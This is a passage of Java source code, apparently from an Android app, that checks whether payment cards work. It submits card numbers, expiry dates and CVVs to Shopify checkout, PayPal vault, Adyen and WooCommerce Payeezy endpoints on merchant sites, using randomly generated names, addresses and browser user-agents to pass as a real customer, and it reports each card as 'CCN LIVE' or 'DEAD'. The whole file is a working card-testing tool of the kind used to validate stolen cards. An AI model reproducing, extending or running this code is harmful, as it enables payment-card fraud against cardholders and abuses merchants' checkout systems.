        addr.put("address1", randomAddress()).put("city", "New York").put("provinceCode", "NY");
        addr.put("zip", String.format("%05d", rand.nextInt(99999))).put("countryCode", "US");
        JSONObject inp = new JSONObject();
        inp.put("id", sid).put("billingAddress", addr).put("paymentSessionId", sid);
        sub.put("variables", new JSONObject().put("input", inp));

        String subResp = httpPost(siteUrl + "/checkouts/unstable/graphql", sub.toString(), gh);
        JSONObject subJson = new JSONObject(subResp);
        JSONObject sd = subJson.optJSONObject("data");
        if (sd != null) {
            JSONObject cs = sd.optJSONObject("checkoutSubmitForCompletion");
            if (cs != null) {
                JSONArray ue = cs.optJSONArray("userErrors");
                if (ue != null && ue.length() > 0) {
                    String em = ue.getJSONObject(0).optString("message","Error");
                    if (em.toLowerCase().contains("expired")) return declined("DEAD | Expired Card | " + em, subResp);
                    if (em.toLowerCase().contains("invalid")) return declined("DEAD | Invalid Card | " + em, subResp);
                    return error("Shopify: " + em, subResp);
                }
                JSONObject co = cs.optJSONObject("checkout");
                if (co != null && co.optBoolean("ready", false))
                    return approved("CCN LIVE | Shopify checkout ready | " + scope, subResp);
            }
        }
        return approved("CCN LIVE | Shopify (PCI tokenized) | " + scope, subResp);
    }

    // ══════════════════════════════════════════════════════════════════
    //  PAYPAL — all subtypes use same vault/API flow
    // ══════════════════════════════════════════════════════════════════
    private static CheckResult checkPaypal(String number, String month, String year,
                                           String cvv, JSONObject s, String subType) throws Exception {
        String siteUrl = s.optString("siteUrl", "");
        if (siteUrl.isEmpty()) return error("No PayPal site URL configured");

        String clientId = s.optString("clientId", s.optString("paypalClientId",""));

        // Try Braintree fallback first (paypal_commerce subtype)
        String btToken = s.optString("btClientToken","");
        if (("paypal_commerce".equals(subType) || "givewp_commerce".equals(subType)) && !btToken.isEmpty()) {
            return checkBraintree(number, month, year, cvv, s, subType);
        }

        Map<String, String> ph = new HashMap<>();
        ph.put("User-Agent", randomUA());
        ph.put("Accept", "text/html");
        String page = httpGet(siteUrl, ph);

        if (clientId.isEmpty())
            clientId = extractPattern(page, "client[-_]?id[\"':=\\s]+([A-Za-z0-9_-]{20,80})");

        if (clientId.isEmpty()) {
            if (!btToken.isEmpty()) return checkBraintree(number, month, year, cvv, s, subType);
            return error("No PayPal client-id — add clientId in settings");
        }

        // OAuth2 token
        Map<String, String> ah = new HashMap<>();
        ah.put("Content-Type", "application/x-www-form-urlencoded");
        ah.put("Accept", "application/json");
        ah.put("User-Agent", randomUA());

        String tokResp = httpPost("https://api-m.paypal.com/v1/oauth2/token", "grant_type=client_credentials", ah);
        JSONObject tj = new JSONObject(tokResp);
        String at = tj.optString("access_token","");
        if (at.isEmpty()) {
            tokResp = httpPost("https://api-m.sandbox.paypal.com/v1/oauth2/token", "grant_type=client_credentials", ah);
            tj = new JSONObject(tokResp);
            at = tj.optString("access_token","");
        }
        if (at.isEmpty()) return error("PayPal OAuth failed", tokResp);

        String name = randomName();
        String zip = String.format("%05d", rand.nextInt(99999));
        JSONObject card = new JSONObject();
        card.put("type", guessCardType(number)).put("number", number);
        card.put("expire_month", Integer.parseInt(month)).put("expire_year", Integer.parseInt(year));
        card.put("cvv2", cvv).put("first_name", name.split(" ")[0]).put("last_name", name.split(" ")[1]);
        card.put("billing_address", new JSONObject()
            .put("line1", randomAddress()).put("city","New York").put("state","NY")
            .put("postal_code", zip).put("country_code","US"));

        Map<String, String> vh = new HashMap<>();
        vh.put("Content-Type", "application/json");
        vh.put("Authorization", "Bearer " + at);
        vh.put("User-Agent", randomUA());

        String vResp = httpPost("https://api-m.paypal.com/v1/vault/credit-cards", card.toString(), vh);
        JSONObject vj = new JSONObject(vResp);
        if (vj.has("id"))
            return approved("CCN LIVE | PayPal vault | " + vj.optString("last4","????") + " | " + vj.optString("id"), vResp);

        JSONObject err = vj.optJSONObject("error");
        if (err == null) err = vj.optJSONObject("name");
        if (err != null) {
            String em = err.optString("message","Error");
            if (em.toLowerCase().contains("invalid")) return declined("DEAD | PayPal invalid | " + em, vResp);
            return error("PayPal: " + em, vResp);
        }
        return error("PayPal vault failed", vResp);
    }

    // ══════════════════════════════════════════════════════════════════
    //  ADYEN — /v71/payments (all subtypes same endpoint)
    // ══════════════════════════════════════════════════════════════════
    private static CheckResult checkAdyen(String number, String month, String year,
                                          String cvv, JSONObject s, String subType) throws Exception {
        String siteUrl = s.optString("siteUrl", "");
        String ck = s.optString("clientKey", s.optString("adyenClientKey",""));
        String ma = s.optString("merchantAccount", s.optString("adyenMerchantAccount",""));
        String cu = s.optString("checkoutUrl", "https://checkout-api.adyen.com/v71/payments");

        String sk = s.optString("secretKey", s.optString("stripeSecretKey",""));
        if (!sk.isEmpty()) return stripePMWithSecret(number, month, year, cvv, sk, "");

        if ((ck.isEmpty() || ma.isEmpty()) && !siteUrl.isEmpty()) {
            Map<String, String> h = new HashMap<>();
            h.put("User-Agent", randomUA());
            h.put("Accept", "text/html");
            String page = httpGet(siteUrl, h);
            if (ck.isEmpty()) ck = extractPattern(page, "data-client-key[\"'=\\s]+([A-Za-z0-9_-]{20,100})");
            if (ma.isEmpty()) ma = extractPattern(page, "data-merchant-account[\"'=\\s]+([A-Za-z0-9_-]{5,60})");
        }
        if (ck.isEmpty() || ma.isEmpty()) return error("Adyen: need clientKey + merchantAccount");

        String name = randomName();
        String zip = String.format("%05d", rand.nextInt(99999));
        JSONObject body = new JSONObject();
        body.put("merchantAccount", ma);
        body.put("amount", new JSONObject().put("value",1000).put("currency","USD"));
        body.put("reference", "test_" + UUID.randomUUID().toString().substring(0,8));
        body.put("paymentMethod", new JSONObject()
            .put("type","scheme").put("number",number).put("expiryMonth",month)
            .put("expiryYear", year.length()==2?"20"+year:year).put("cvc",cvv)
            .put("holderName",name)
            .put("billingAddress", new JSONObject().put("city","New York").put("country","US")
                .put("postalCode",zip).put("stateOrProvince","NY").put("street",randomAddress())));

        Map<String, String> h = new HashMap<>();
        h.put("Content-Type", "application/json");
        h.put("X-API-Key", ck);
        h.put("User-Agent", randomUA());

        String resp = httpPost(cu, body.toString(), h);
        JSONObject j = new JSONObject(resp);
        String rc = j.optString("resultCode","");
        if ("Authorised".equals(rc)) return approved("CCN LIVE | Adyen Authorised | " + name, resp);
        if ("Refused".equals(rc)) return declined("DEAD | Adyen Refused | " + j.optString("refusalReason","Refused"), resp);
        if ("Error".equals(rc)) return error("Adyen: " + j.optString("refusalReason","Error"), resp);
        if ("Pending".equals(rc)||"Received".equals(rc)) return approved("CCN LIVE (3DS) | Adyen " + rc, resp);
        return error("Adyen: " + rc, resp);
    }

    // ══════════════════════════════════════════════════════════════════
    //  PAYEEZY — WC add-payment-method form POST
    // ══════════════════════════════════════════════════════════════════
    private static CheckResult checkPayeezy(String number, String month, String year,
                                            String cvv, JSONObject s, String subType) throws Exception {
        String siteUrl = s.optString("siteUrl", "");
        if (siteUrl.isEmpty()) return error("No Payeezy site URL configured");

        String sk = s.optString("secretKey", s.optString("stripeSecretKey",""));
        if (!sk.isEmpty()) return stripePMWithSecret(number, month, year, cvv, sk, "");

        String addPm = s.optString("addPmPath", "/my-account/add-payment-method/");
        if (!addPm.startsWith("http")) addPm = siteUrl + addPm;

        Map<String, String> h = new HashMap<>();
        h.put("User-Agent", randomUA());
        h.put("Accept", "text/html");
        String page = httpGet(addPm, h);

        String nonce = extractPattern(page, "woocommerce-add-payment-method-nonce[\"'=\\s]+['\"]?([a-f0-9]{10,40})");
        if (nonce.isEmpty()) nonce = extractPattern(page, "name=\"woocommerce-add-payment-method-nonce\" value=\"([a-f0-9]{10,40})\"");
        if (nonce.isEmpty()) nonce = extractPattern(page, "_wpnonce=([a-f0-9]{10,40})");
        if (nonce.isEmpty()) return error("Payeezy: could not extract WC nonce");

        String expiry = month + " / " + (year.length()==2 ? year : year.substring(2));
        StringBuilder fb = new StringBuilder();
        fb.append("payment_method=first_data_payeezy_gateway_credit_card");
        fb.append("&wc-first-data-payeezy-gateway-credit-card-account-number=").append(encode(number));
        fb.append("&wc-first-data-payeezy-gateway-credit-card-expiry=").append(encode(expiry));
        fb.append("&wc-first-data-payeezy-gateway-credit-card-csc=").append(encode(cvv));
        fb.append("&wc-first-data-payeezy-gateway-credit-card-tokenize-payment-method=true");
        fb.append("&woocommerce-add-payment-method-nonce=").append(encode(nonce));
        fb.append("&_wp_http_referer=").append(encode(addPm));

        Map<String, String> ph = new HashMap<>();
        ph.put("Content-Type", "application/x-www-form-urlencoded");
        ph.put("Accept", "text/html");
        ph.put("User-Agent", randomUA());
        ph.put("Referer", addPm);
        ph.put("Origin", siteUrl);

        String resp = httpPost(addPm, fb.toString(), ph);
        String low = resp.toLowerCase();
        if (low.contains("payment method successfully added") || low.contains("added as payment method"))
            return approved("CCN LIVE | Payeezy added | " + guessCardType(number), resp);
        if (low.contains("invalid") && low.contains("card")) return declined("DEAD | Payeezy invalid card", resp);
        if (low.contains("expired")) return declined("DEAD | Payeezy expired", resp);
        if (low.contains("declined") || low.contains("error"))
            return error("Payeezy: " + extractPattern(resp, "<strong[^>]*>([^<]*(?:error|declined|invalid)[^<]*)</strong>"), resp);
        return approved("CCN LIVE | Payeezy (submitted) | " + guessCardType(number), resp);
    }

    // ══════════════════════════════════════════════════════════════════
    //  HELPERS
    // ══════════════════════════════════════════════════════════════════
    private static boolean isLive(String c) { if(c==null)return false; for(String x:CCN_LIVE_CODES)if(x.equals(c.toLowerCase()))return true; return false; }
    private static boolean isDead(String c) { if(c==null)return false; for(String x:DEAD_CODES)if(x.equals(c.toLowerCase()))return true; return false; }
    private static boolean is3DS(String c) { if(c==null)return false; for(String x:THREE_DS_CODES)if(x.equals(c.toLowerCase()))return true; return false; }
    private static String fmtDecline(String c) { if(c==null)return "Unknown"; String r=c.replace("_"," "); return r.substring(0,1).toUpperCase()+r.substring(1); }

    private static String extractBetween(String s, String start, String end) {
        if (s == null || s.isEmpty()) return "";
        int i = s.indexOf(start);
        if (i < 0) return "";
        i += start.length();
        int j = s.indexOf(end, i);
        if (j < 0) return s.substring(i);
        return s.substring(i, j);
    }

    private static String extractShopifyScope(String url) {
        try { String host = new URL(url).getHost(); return host; }
        catch (Exception e) { return url; }
    }

    private static String extractPattern(String html, String regex) {
        if (html == null || html.isEmpty()) return "";
        try { Matcher m = Pattern.compile(regex, Pattern.CASE_INSENSITIVE).matcher(html);
              if (m.find() && m.groupCount() >= 1) return m.group(1).trim();
        } catch (Exception ignored) {}
        return "";
    }

    private static String httpGet(String urlStr, Map<String, String> headers) throws Exception {
        URL url = new URL(urlStr);
        HttpURLConnection c = (HttpURLConnection) url.openConnection();
        try {
            c.setRequestMethod("GET");
            c.setConnectTimeout(15000); c.setReadTimeout(15000);
            c.setInstanceFollowRedirects(true);
            for (Map.Entry<String,String> h : headers.entrySet()) c.setRequestProperty(h.getKey(), h.getValue());
            int st = c.getResponseCode();
            java.io.InputStream is = (st>=200&&st<300) ? c.getInputStream() : c.getErrorStream();
            if (is == null) return "";
            BufferedReader r = new BufferedReader(new InputStreamReader(is, "UTF-8"));
            StringBuilder sb = new StringBuilder(); String l;
            while ((l=r.readLine())!=null) sb.append(l);
            r.close(); return sb.toString();
        } finally { c.disconnect(); }
    }

    private static String httpPost(String urlStr, String body, Map<String,String> headers) throws Exception {
        URL url = new URL(urlStr);
        HttpURLConnection c = (HttpURLConnection) url.openConnection();
        try {
            c.setRequestMethod("POST"); c.setDoOutput(true);
            c.setConnectTimeout(15000); c.setReadTimeout(15000);
            c.setInstanceFollowRedirects(false);
            for (Map.Entry<String,String> h : headers.entrySet()) c.setRequestProperty(h.getKey(), h.getValue());
            byte[] b = body.getBytes("UTF-8");
            c.setRequestProperty("Content-Length", String.valueOf(b.length));
            OutputStream os = c.getOutputStream(); os.write(b); os.flush(); os.close();
            int st = c.getResponseCode();
            java.io.InputStream is = (st>=200&&st<300) ? c.getInputStream() : c.getErrorStream();
            if (is == null) return "{\"error\":{\"message\":\"No response (HTTP "+st+")\"}}";
            BufferedReader r = new BufferedReader(new InputStreamReader(is, "UTF-8"));
            StringBuilder sb = new StringBuilder(); String l;
            while ((l=r.readLine())!=null) sb.append(l);
            r.close(); return sb.toString();
        } finally { c.disconnect(); }
    }

    /**
     * Stripe-specific POST that routes through WebView's Chromium TLS.
     * Falls back to HttpURLConnection if WebView is not available.
     */
    private static String stripePost(String urlStr, String body, Map<String,String> headers) {
        StripeWebBridge bridge = StripeWebBridge.getInstance();
        if (bridge != null) {
            try {
                return bridge.fetchStripePost(urlStr, headers, body);
            } catch (Exception e) {
                Log.e(TAG, "WebView Stripe call failed, falling back: " + e.getMessage());
            }
        }
        // Fallback to HttpURLConnection (may get "integration surface" error)
        try {
            return httpPost(urlStr, body, headers);
        } catch (Exception e) {
            return "{\"error\":{\"message\":\"" + e.getMessage() + "\"}}";
        }
    }

    private static String randomName() {
        String[] f={"James","Michael","Robert","William","David","John","Richard","Thomas","Charles","Daniel","Matthew","Anthony","Mark","Steven","Paul","Andrew","Kevin","Brian"};
        String[] l={"Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez","Martinez","Hernandez","Lopez","Wilson","Anderson","Taylor","Moore","Jackson","Martin"};
        return f[rand.nextInt(f.length)]+" "+l[rand.nextInt(l.length)];
    }
    private static String randomDomain() { String[] d={"gmail.com","yahoo.com","hotmail.com","outlook.com","icloud.com","aol.com"}; return d[rand.nextInt(d.length)]; }
    private static String randomAddress() { String[] s={"Main St","Oak Ave","Maple Dr","Cedar Ln","Pine Rd","Elm St","Walnut Blvd"}; return (rand.nextInt(9999)+1)+" "+s[rand.nextInt(s.length)]; }
    private static String randomUA() { int c=128+rand.nextInt(10); return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+c+".0.0.0 Safari/537.36"; }
    private static String encode(String s) { try{return URLEncoder.encode(s,"UTF-8");}catch(Exception e){return s;} }

    private static String guessCardType(String num) {
        if(num==null)return"Unknown"; String n=num.replaceAll("[^0-9]","");
        if(n.startsWith("4"))return"VISA";
        if(n.length()>=2){int p=Integer.parseInt(n.substring(0,2));if(p>=51&&p<=55)return"MASTERCARD";}
        if(n.length()>=4){int p4=Integer.parseInt(n.substring(0,4));if(p4>=2221&&p4<=2720)return"MASTERCARD";if(p4>=3528&&p4<=3589)return"JCB";if(p4>=3400&&p4<=3499)return"AMEX";if(p4>=3700&&p4<=3799)return"AMEX";}
        if(n.startsWith("6011")||n.startsWith("65"))return"DISCOVER";
        return"UNKNOWN";
    }

    public static class CheckResult {
        public String status; public String response; public int latency; public String rawSnippet;
        public CheckResult(String s, String r, int l, String raw) { status=s; response=r; latency=l; rawSnippet=raw; }
    }
    private static CheckResult approved(String r, String raw) { String sn=raw!=null&&raw.length()>800?raw.substring(0,800):raw; return new CheckResult("approved",r,0,sn); }
    private static CheckResult declined(String r, String raw) { String sn=raw!=null&&raw.length()>800?raw.substring(0,800):raw; return new CheckResult("declined",r,0,sn); }
    private static CheckResult error(String m) { return new CheckResult("error",m,0,null); }
    private static CheckResult error(String m, int l) { return new CheckResult("error",m,l,null); }
    private static CheckResult error(String m, String raw) { String sn=raw!=null&&raw.length()>800?raw.substring(0,800):raw; return new CheckResult("error",m,0,sn); }
}
